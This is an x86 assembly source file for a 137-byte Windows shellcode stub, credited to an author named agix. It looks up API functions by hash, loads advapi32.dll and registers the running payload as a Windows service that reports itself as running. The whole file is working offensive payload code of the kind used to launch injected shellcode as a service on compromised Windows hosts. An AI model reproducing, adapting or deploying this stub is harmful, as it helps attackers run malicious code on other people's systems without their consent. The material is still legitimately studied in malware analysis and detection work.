;-----------------------------------------------------------------------------;
; Author: agix (florian.gaultier[at]gmail[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Size: 137 bytes
;-----------------------------------------------------------------------------;

[BITS 32]
; Input: EBP must be the address of 'api_call'.

push byte 0x0
push 0x32336970
push 0x61766461
push esp
push 0x726774c
call ebp		;load advapi32.dll
push 0x00454349
push 0x56524553
mov ecx, esp	;ServiceTableEntry.SVCNAME
lea eax, [ebp+0xd0];ServiceTableEntry.SvcMain
push 0x00000000
push eax
push ecx
mov eax,esp
push 0x00000000
push eax
push 0xCB72F7FA
call ebp		;call StartServiceCtrlDispatcherA(ServiceTableEntry)
push 0x00000000
push 0x56A2B5F0
call ebp		;call ExitProcess(0)
pop eax			;SvcCtrlHandler
pop eax
pop eax
pop eax
xor eax,eax
ret
cld 			;SvcMain
call me
me:
pop ebp
sub ebp, 0xd6	;ebp => hashFunction
push 0x00464349
push 0x56524553
mov ecx, esp	;SVCNAME
lea eax, [ebp+0xc9];SvcCtrlHandler
push 0x00000000
push eax
push ecx
push 0x5244AA0B
call ebp		;RegisterServiceCtrlHandlerExA
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000000
push 0x00000004
push 0x00000010
mov ecx, esp
push 0x00000000
push ecx
push eax
push 0x7D3755C6
call ebp		;SetServiceStatus RUNNING